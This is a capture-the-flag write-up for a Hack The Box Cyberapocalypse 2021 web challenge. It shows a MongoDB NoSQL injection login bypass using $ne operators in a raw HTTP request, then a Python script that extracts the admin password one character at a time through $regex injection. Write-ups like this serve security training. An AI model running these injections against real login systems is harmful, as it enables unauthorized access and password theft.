---
slug: wild-goose-hunt-cyberapocalypse-2021-ctf
title: Wild goose hunt - Cyberapocalypse 2021 CTF
description: This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the Wild goose hunt challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.

### Prompt

Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?

<!-- truncate -->

### Recon

We're given source-code for a web-site, and a hosted version.

With a quick overview of the code we're given, we see that the site uses `mongodb` as its database. Albeit slightly dumb, I didn't go into any more detail than this, and didn't check where the flag is actually hidden.

### Attempting to log in

My initial idea was to simply log into the site, and see if that doesn't display the flag. So, I intercepted a login request with Burpsuite, and changed the POST request data to a classic mongo injection string,

```yaml
POST /api/login HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://localhost:1337
Content-Length: 35
Connection: close

username[$ne]=foo&password[$ne]=bar
```

Which returns a login success message.

```yaml
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 62
ETag: W/"3e-BvDyP4u8qgWgGOMxzemBf6QGSBc"
Date: Tue, 27 Apr 2021 17:31:15 GMT
Connection: close

{"logged":1,"message":"Login Successful, welcome back admin."}
```

But upon observing the login page of the site, we find nothing, but a welcome message.

![welcome message](/content/images/2021/04/Screenshot_2021-04-27_20-34-50.png)

So at this point, I just assumed that the flag is the password itself (which I would had already known, if I had checked the `entrypoint.sh` script).

### Solution

In order to correctly guess the password (and know what it is), we are going to once again use nosql injection, but this time we will use the [$regex] query for mongo.

1. We send a POST request to `/api/login` using the username `admin` and a regex match query for the password with a random (printable) character.
2. If the login is successful, we assume that this character is indeed part of the password, so we add it to our flag, and try again with the next position in the password
3. Simple as that, let's script it

```python
import requests
import string

# Assumptions
# We suspect that the password is the flag
# the flag starts with "CBTH{"
# and ends with "}"

flag = "CHTB{"
url = "http://165.227.236.40:31535/api/login"

# Each time a login is successful, we should start the loop from the first character
startFromFirstChar = True

while startFromFirstChar:
    startFromFirstChar = False

    # avoiding characters like * . & +
    for char in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + char
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data)

        # A correct password means we get "logged":1 in response
        if ('"logged":1' in r.text):
            print(payload)
            startFromFirstChar = True
            flag = payload

            # Exit if "}" is at the end and we are logged in
            if char == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
```

![running](/content/images/2021/04/Screenshot_2021-04-28_09-21-31.png)

And so, we get our flag

```sh
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```